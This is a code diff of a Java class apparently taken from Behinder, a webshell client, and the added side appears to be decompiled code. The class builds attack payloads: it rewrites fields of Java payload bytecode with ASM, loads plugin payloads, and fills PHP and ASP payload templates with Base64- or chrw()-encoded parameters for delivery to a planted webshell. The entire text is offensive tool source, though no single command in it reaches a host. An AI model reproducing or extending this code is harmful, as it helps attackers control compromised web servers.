@@ -1,6 +1,6 @@
 package net.rebeyond.behinder.core;
 
-import java.util.Base64;
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import net.rebeyond.behinder.utils.ReplacingInputStream;
 import net.rebeyond.behinder.utils.Utils;
 import org.objectweb.asm.ClassAdapter;
@@ -12,6 +12,7 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.util.Map;
+
 public class Params {
 
     public static class t extends ClassLoader {
@@ -24,11 +25,31 @@ public class Params {
         ClassReader classReader = new ClassReader(clsName);
         ClassWriter cw = new ClassWriter(1);
         classReader.accept(new ClassAdapter(cw) {
+            /* class net.rebeyond.behinder.core.Params.AnonymousClass1 */
+
+            @Override // org.objectweb.asm.ClassAdapter, org.objectweb.asm.ClassVisitor
             public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
-                if (!params.containsKey(filedName)) {
-                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
+                if (params.containsKey(filedName)) {
+                    return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
                 }
-                return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
+                return super.visitField(arg0, filedName, arg2, arg3, arg4);
+            }
+        }, 0);
+        return cw.toByteArray();
+    }
+
+    public static byte[] getParamedClassForPlugin(String payloadPath, final Map<String, String> params) throws Exception {
+        ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
+        ClassWriter cw = new ClassWriter(1);
+        classReader.accept(new ClassAdapter(cw) {
+            /* class net.rebeyond.behinder.core.Params.AnonymousClass2 */
+
+            @Override // org.objectweb.asm.ClassAdapter, org.objectweb.asm.ClassVisitor
+            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
+                if (params.containsKey(filedName)) {
+                    return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
+                }
+                return super.visitField(arg0, filedName, arg2, arg3, arg4);
             }
         }, 0);
         return cw.toByteArray();
@@ -41,7 +62,7 @@ public class Params {
         }
         String paramsStr = "";
         for (String paramName : params.keySet()) {
-            paramsStr = paramsStr + paramName + ":" + Base64.getEncoder().encodeToString(params.get(paramName).getBytes()) + ",";
+            paramsStr = paramsStr + paramName + ":" + Base64.encode(params.get(paramName).getBytes()) + ",";
         }
         return Utils.mergeBytes(result, ("~~~~~~" + paramsStr.substring(0, paramsStr.length() - 1)).getBytes());
     }
@@ -69,9 +90,8 @@ public class Params {
     }
 
     public static byte[] getParamedPhp(String clsName, Map<String, String> params) throws Exception {
-        String payloadPath = "net/rebeyond/behinder/payload/php/" + clsName + ".php";
         StringBuilder code = new StringBuilder();
-        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
+        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/php/" + clsName + ".php"));
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         while (true) {
             int b = bis.read();
@@ -92,9 +112,8 @@ public class Params {
     }
 
     public static byte[] getParamedAsp(String clsName, Map<String, String> params) throws Exception {
-        String payloadPath = "net/rebeyond/behinder/payload/asp/" + clsName + ".asp";
         StringBuilder code = new StringBuilder();
-        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
+        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/asp/" + clsName + ".asp"));
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         while (true) {
             int b = bis.read();
@@ -112,13 +131,13 @@ public class Params {
                 String paraValue = params.get(paraName);
                 String paraValueEncoded = "";
                 for (int i = 0; i < paraValue.length(); i++) {
-                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
+                    paraValueEncoded = paraValueEncoded + "&chrw(" + ((int) paraValue.charAt(i)) + ")";
                 }
                 paraList2 = paraList2 + "," + paraValueEncoded.replaceFirst("&", "");
             }
             paraList = paraList2 + ")";
         }
-        code.append("\r\nmain " + paraList.replaceFirst(",", ""));
+        code.append("\r\nmain " + paraList.replaceFirst(",", "") + "");
         return code.toString().getBytes();
     }
 }
